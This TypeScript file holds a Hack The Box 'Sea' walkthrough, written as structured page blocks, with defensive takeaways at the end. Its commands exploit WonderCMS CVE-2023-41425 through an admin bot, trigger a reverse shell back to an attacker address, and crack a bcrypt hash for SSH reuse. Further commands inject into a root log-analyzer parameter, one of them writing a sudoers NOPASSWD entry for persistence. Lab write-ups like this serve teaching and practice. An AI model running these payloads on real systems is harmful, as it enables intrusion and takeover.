import type { WalkthroughDoc } from "./types";

export const sea: WalkthroughDoc = {
  slug: "sea",
  name: "Sea",
  platform: "Hack The Box",
  os: "Linux",
  difficulty: "Easy",
  retired: "Dec 2024",
  ip: "10.10.11.28",
  tags: [
    "WonderCMS",
    "CVE-2023-41425",
    "XSS-to-RCE",
    "bcrypt cracking",
    "Password reuse",
    "SSH tunneling",
    "Command injection",
  ],
  lede: "A brochure site hides a flat-file **WonderCMS 3.2.0** install with a client-side theme installer flaw. We phish the admin bot with a stored-XSS link, ride its session into remote code execution, crack a bcrypt hash out of the CMS database, reuse the password over SSH, and finish by injecting a shell metacharacter into a root-owned log analyzer that only listens on loopback.",
  summary:
    "Phish the WonderCMS admin bot with a CVE-2023-41425 XSS-to-RCE, crack a bcrypt hash for SSH password reuse, then command-inject a loopback log analyzer running as root.",
  sections: [
    {
      id: "overview",
      num: "00",
      title: "Overview",
      blocks: [
        { kind: "epigraph", text: "“The sea, once it casts its spell, holds one in its net of wonder forever.” — Jacques Cousteau" },
        { kind: "p", text: "**Sea** is an Easy-rated Linux machine that reads like a real small-business compromise. The public face is a tiny surfing/biking brochure page, but underneath it runs **WonderCMS 3.2.0** — a flat-file CMS whose module/theme installer carries a known XSS-to-RCE (**CVE-2023-41425**). The twist is that the vulnerable action needs an *authenticated admin*, and the box supplies one in the form of a bot that periodically clicks links submitted through the contact form. We weaponise that bot to reach code execution." },
        { kind: "p", text: "From there the path is a clean chain of everyday mistakes: a secret sitting in a world-readable config, a password reused across the web app and an OS account, and an internal admin tool that trusts user input and runs as root. Before the details, here is the whole route." },
        { kind: "h4", text: "Attack chain" },
        {
          kind: "ol",
          items: [
            "**recon** — `nmap` finds SSH + Apache; add `sea.htb`",
            "**enumerate** — WonderCMS 3.2.0, `bike` theme, contact form",
            "**CVE-2023-41425** — XSS link → admin bot → theme RCE",
            "**www-data** — reverse shell from the planted theme",
            "**loot** — bcrypt hash in `data/database.js`",
            "**crack** — `hashcat -m 3200` → `mychemicalromance`",
            "**ssh amay** — password reuse → `user.txt`",
            "**enumerate** — `127.0.0.1:8080` System Monitor",
            "**tunnel** — `ssh -L` the loopback panel out",
            "**command injection** — `log_file=…;<cmd>` runs as root",
            "**root** — read `root.txt` / drop a sudoers entry",
          ],
        },
        { kind: "callout", variant: "note", title: "Two moving parts to respect", text: "This box has an *asynchronous* foothold — the admin bot clicks on its own schedule, so the exploit is fire-and-wait, not fire-and-forget. And the privesc target is *loopback-only*; you cannot touch port 8080 until you have an SSH session to tunnel through. Line those two facts up early and the box flows." },
      ],
    },
    {
      id: "recon",
      num: "01",
      title: "Enumeration",
      blocks: [
        { kind: "h3", text: "Port scan" },
        { kind: "p", text: "A full-range scan followed by a service scan on the survivors shows a deliberately small surface — just SSH and a web server. Nothing else to chase, so the web app is the whole game." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ nmap -p- --min-rate 10000 10.10.11.28",
            "$ nmap -sC -sV -p22,80 10.10.11.28",
            "PORT   STATE SERVICE VERSION",
            "22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu",
            "80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))",
          ],
        },
        { kind: "p", text: "Port 80 answers to a virtual host rather than the raw IP, so we point the hostname at the target before we browse." },
        {
          kind: "code",
          lang: "bash",
          lines: ["$ echo '10.10.11.28 sea.htb' | sudo tee -a /etc/hosts"],
        },
        { kind: "callout", variant: "tip", title: "Browse the vhost, not the IP", text: "The site only renders correctly through `sea.htb`; hitting the bare IP is uninformative until the hosts entry exists. Treat the exact Apache patch level as approximate — banners drift between `2.4.41` and `2.4.52` across the box's lifetime, so confirm from the live response rather than trusting a writeup." },
      ],
    },
    {
      id: "web-enum",
      num: "02",
      title: "Fingerprinting WonderCMS",
      blocks: [
        { kind: "p", text: "The landing page is a single-theme brochure built on the WonderCMS **bike** theme. Content discovery plus a look at the page source pulls out the theme path, a `contact` page backed by `contact.php`, and a `/data` directory that returns **403 Forbidden**. The README shipped with the theme names the CMS outright, and the WonderCMS version metadata pins it to **3.2.0** — squarely inside the CVE-2023-41425 window." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ ffuf -c -u http://sea.htb/FUZZ \\",
            "      -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
            "$ gobuster dir -u http://sea.htb/ -w /usr/share/wordlists/dirb/common.txt -x php",
            "",
            "$ curl -s http://sea.htb/ | grep -i themes",
            "# -> http://sea.htb/themes/bike/css/style.css",
            "$ curl -s http://sea.htb/data/",
            "# 403 Forbidden",
            "$ curl -s http://sea.htb/themes/bike/README.md",
            "# identifies WonderCMS + the bike theme; version metadata -> 3.2.0",
          ],
          highlight: [10],
        },
        { kind: "callout", variant: "note", title: "Flat-file, not SQL", text: "WonderCMS keeps *all* state in files under `/data` — the whole database is `data/database.js`, a JSON blob. There is no SQL backend to attack. The 403 on `/data` is by design over HTTP; we read `database.js` later from the filesystem, once we have a shell. The vulnerable range for CVE-2023-41425 is WonderCMS **3.2.0 – 3.4.2**." },
        { kind: "p", text: "One page matters more than the rest: the contact form. It is the only place an unauthenticated visitor can hand a URL to the site's administrator, which is exactly the primitive the exploit needs." },
      ],
    },
    {
      id: "foothold",
      num: "03",
      title: "Foothold — CVE-2023-41425 via the admin bot",
      blocks: [
        { kind: "epigraph", text: "“Click here, trusted admin.” — every XSS payload, ever" },
        { kind: "p", text: "CVE-2023-41425 is a cross-site scripting flaw in WonderCMS's module/theme installer. The installer action (`installModule`) can be driven entirely from JavaScript running in an authenticated admin's browser: the payload lifts the admin's CSRF token and then calls `installModule` to pull a *theme* of our choosing — one that happens to contain a PHP reverse shell — straight into the live site." },
        { kind: "p", text: "The delivery mechanism is the contact form. We submit a link to our own hosted `xss.js` in the website/URL field; when the admin bot opens that link, our JavaScript executes inside its session and installs the malicious theme. A public exploit automates the payload generation and hosting for us." },
        {
          kind: "code",
          lang: "bash",
          label: "attacker — stage the payload",
          lines: [
            "$ git clone https://github.com/xpltive/CVE-2023-41425",
            "$ cd CVE-2023-41425",
            "# serves xss.js and the reverse-shell theme zip on -sh:-sp,",
            "# and takes the reverse shell on -lh:-lp",
            "$ python3 exploit.py -u http://sea.htb/loginURL \\",
            "      -lh 10.10.14.101 -lp 7777 -sh 10.10.14.101 -sp 8888",
          ],
        },
        { kind: "p", text: "With the payload hosted and a listener up, we drop the crafted URL into the contact form and wait for the bot to take the bait. Once the theme is planted, we trigger its shell by requesting `rev.php`." },
        {
          kind: "code",
          lang: "bash",
          label: "attacker — catch and trigger",
          lines: [
            "# Browse http://sea.htb/index.php?page=contact",
            "#   -> paste the XSS link into the website/URL field -> Submit",
            "$ nc -lvnp 7777",
            "",
            "# once the bot has installed the theme, trigger the planted shell:",
            "$ curl 'http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.101&lport=7777'",
            "# => connect back: www-data@sea",
          ],
          highlight: [7],
        },
        { kind: "callout", variant: "warn", title: "Fire-and-wait, and keep both servers up", text: "The admin bot only clicks submitted links *periodically* — give it a minute or two after you submit, don't assume it failed. Keep **both** the exploit's HTTP server (`-sh/-sp`) and your `nc` listener (`-lh/-lp`) running the whole time; the JS has to fetch the theme zip from you. If the shell drops, `rev.php` is re-triggerable with fresh `lhost/lport` parameters." },
        { kind: "callout", variant: "note", title: "Alternate path", text: "If the bot is uncooperative, the WonderCMS admin login can also be brute-forced directly (an approach 0xdf documents as a *Beyond Root* route), landing you in the same authenticated context without the XSS relay." },
      ],
    },
    {
      id: "loot",
      num: "04",
      title: "Looting and cracking the bcrypt hash",
      blocks: [
        { kind: "p", text: "Our `www-data` shell can now read the flat-file database that HTTP hid behind a 403. `data/database.js` holds the WonderCMS admin password as a **bcrypt** (`$2y$`) hash — slow to crack by design, but no match for a wordlist if the password is weak." },
        {
          kind: "code",
          lang: "bash",
          label: "www-data@sea",
          lines: [
            "$ cat /var/www/sea/data/database.js",
            "# ...",
            "#   \"password\": \"$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q\",",
            "# ...",
          ],
          highlight: [2],
        },
        { kind: "p", text: "We pull the hash back to our box and set hashcat's bcrypt mode (`-m 3200`) loose on `rockyou.txt`. bcrypt is deliberately expensive, so this takes longer than an MD5/SHA crack would — but the plaintext is a common dictionary entry and falls quickly." },
        {
          kind: "code",
          lang: "bash",
          label: "attacker — crack",
          lines: [
            "$ echo '$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q' > hash.txt",
            "$ hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt",
            "...",
            "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance",
          ],
          highlight: [3],
        },
        { kind: "callout", variant: "key", title: "Recovered", text: "WonderCMS admin bcrypt hash from `data/database.js`, cracked to **`mychemicalromance`**. The box has two low-privilege users, **amay** and **geo** — and this password is about to unlock one of them." },
      ],
    },
    {
      id: "user",
      num: "05",
      title: "User — SSH as amay via password reuse",
      blocks: [
        { kind: "p", text: "The cracked secret belongs to the CMS admin, but people reuse passwords — so we try it against the OS accounts over SSH. It authenticates as **amay**, upgrading our unstable `www-data` web shell into a clean interactive session and giving us the user flag." },
        {
          kind: "code",
          lang: "bash",
          label: "attacker",
          lines: [
            "$ ssh amay@sea.htb",
            "# password: mychemicalromance",
            "amay@sea:~$ id",
            "uid=1000(amay) gid=1000(amay) groups=1000(amay)",
            "amay@sea:~$ cat /home/amay/user.txt",
            "76a8fc64····························",
          ],
          highlight: [5],
        },
        { kind: "callout", variant: "tip", title: "Get the real SSH session", text: "Don't skip the pivot to a proper SSH login just because you already have code execution as `www-data`. The next stage needs an SSH **local port-forward**, and only an authenticated interactive session gives you that channel cleanly." },
      ],
    },
    {
      id: "internal-service",
      num: "06",
      title: "Discovering the loopback System Monitor",
      blocks: [
        { kind: "p", text: "Local enumeration as amay is where the privesc lead surfaces. Listing listening sockets shows a service bound to **127.0.0.1:8080** that never appeared in our external nmap — a custom, in-development web panel titled *System Monitor (Developing)*." },
        {
          kind: "code",
          lang: "bash",
          label: "amay@sea",
          lines: [
            "amay@sea:~$ ss -tlnp",
            "State   Recv-Q  Send-Q  Local Address:Port   Peer Address:Port",
            "LISTEN  0       128     127.0.0.1:8080        0.0.0.0:*",
            "LISTEN  0       511         0.0.0.0:80          0.0.0.0:*",
            "LISTEN  0       128         0.0.0.0:22          0.0.0.0:*",
          ],
          highlight: [2],
        },
        { kind: "p", text: "Because 8080 only listens on loopback, we can't reach it from our VPN address. An SSH local port-forward tunnels it out to our own machine, where we can point a browser at it." },
        {
          kind: "code",
          lang: "bash",
          label: "attacker — forward the panel",
          lines: [
            "$ ssh -L 8080:localhost:8080 amay@sea.htb",
            "# then browse http://localhost:8080/",
            "#   -> 'System Monitor (Developing)' with an 'Analyze Log File' feature",
          ],
        },
        { kind: "callout", variant: "note", title: "\"Developing\" is the hint", text: "The panel's *Analyze Log File* function lets you pick `access.log` or `auth.log` and runs the analysis **as root** — that root context is the whole reason this becomes a full compromise rather than a lateral move. The `(Developing)` label in the title is the intended nudge that the feature is unfinished and unsafe." },
      ],
    },
    {
      id: "privesc",
      num: "07",
      title: "Privesc — command injection in log_file",
      blocks: [
        { kind: "epigraph", text: "“It's not user input if you trust it.” — the log analyzer, apparently" },
        { kind: "p", text: "The *Analyze* action posts the chosen log path in a `log_file` parameter, and the backend drops that value straight into a shell command that executes as root. Classic string concatenation into a shell — so a `;` terminates the intended command and lets us append our own. We prove the context first with `id`." },
        {
          kind: "code",
          lang: "bash",
          label: "attacker — through the tunnel",
          lines: [
            "# keep a valid log path before the ; so the analyzer runs cleanly",
            "$ curl -s -X POST http://localhost:8080/ \\",
            "      --data 'log_file=/var/www/sea/access.log;id'",
            "# => uid=0(root) gid=0(root) groups=0(root)",
          ],
          highlight: [3],
        },
        { kind: "p", text: "Root code execution confirmed. From here we can read the flag outright, or — the cleaner option — grant ourselves a durable root shell by writing a sudoers drop-in or planting an SSH key in root's `authorized_keys`." },
        {
          kind: "code",
          lang: "bash",
          label: "attacker — persist as root",
          lines: [
            "# option A: grant amay passwordless sudo",
            "$ curl -s -X POST http://localhost:8080/ \\",
            "      --data \"log_file=access.log;echo 'amay ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/amay\"",
            "# then, in the SSH session:",
            "amay@sea:~$ sudo su -",
            "root@sea:~#",
            "",
            "# option B: drop your public key into /root/.ssh/authorized_keys, then ssh root@sea.htb",
          ],
        },
        { kind: "callout", variant: "warn", title: "Mind the encoding and the valid path", text: "Depending on whether you send the payload via browser, `curl`, or Burp you may need to URL-encode it (space as `+`/`%20`, `;` as `%3B`). Keep a real log path in front of the `;` so the analyzer's own command succeeds — otherwise it can bail before your injected command runs. Injected command output is echoed back inside the analyzer's HTTP response body, so read the result there." },
      ],
    },
    {
      id: "root",
      num: "08",
      title: "Root",
      blocks: [
        { kind: "p", text: "With root execution — whether one-shot through the injection or via the sudoers drop-in — the final flag is ours." },
        {
          kind: "code",
          lang: "bash",
          label: "root@sea",
          lines: [
            "# one-shot read straight through the injection:",
            "$ curl -s -X POST http://localhost:8080/ \\",
            "      --data 'log_file=/var/www/sea/access.log;cat /root/root.txt'",
            "286204e3····························",
          ],
          highlight: [3],
        },
        { kind: "p", text: "From an unauthenticated brochure page to root: a client-side CMS flaw phished through a bot, a reused password, and one trusting shell call. Sea is caught." },
      ],
    },
    {
      id: "defense",
      num: "09",
      title: "Defensive takeaways",
      blocks: [
        {
          kind: "ul",
          items: [
            "**Patch WonderCMS.** CVE-2023-41425 (XSS-to-RCE in `installModule`) affects 3.2.0–3.4.2. Upgrade past 3.4.2 and require re-authentication for module/theme installation so a stolen CSRF token isn't enough.",
            "**Never reuse a CMS password for OS accounts.** The same cracked bcrypt secret opened the `amay` SSH login. Enforce unique, non-dictionary credentials — `rockyou` recovered `mychemicalromance` in minutes.",
            "**Protect flat-file secrets.** WonderCMS parked a bcrypt hash in `data/database.js`, readable by `www-data`. Lock down file permissions and use a per-secret work factor so a foothold user can't harvest and crack it offline.",
            "**Never concatenate user input into a shell.** The `log_file` parameter enabled command injection with a single `;`. Use exec-style APIs with argument arrays, a strict allow-list of log paths, and input validation instead of string building.",
            "**Don't run internal tooling as root.** The log analyzer executed with root privileges, turning an injection into total compromise. Apply least privilege and drop capabilities the tool doesn't need.",
            "**Loopback is not a security boundary.** Binding the panel to `127.0.0.1:8080` was trivially bypassed with an SSH tunnel. Authenticate the service itself and monitor for anomalous local port-forwarding rather than relying on network position.",
          ],
        },
        { kind: "callout", variant: "note", title: "Skills exercised", text: "web enumeration · CMS fingerprinting · stored-XSS-to-RCE via an admin bot · CSRF-token abuse · bcrypt hash cracking · password-reuse pivoting · loopback service discovery · SSH local port forwarding · command injection · root persistence via sudoers." },
      ],
    },
  ],
};
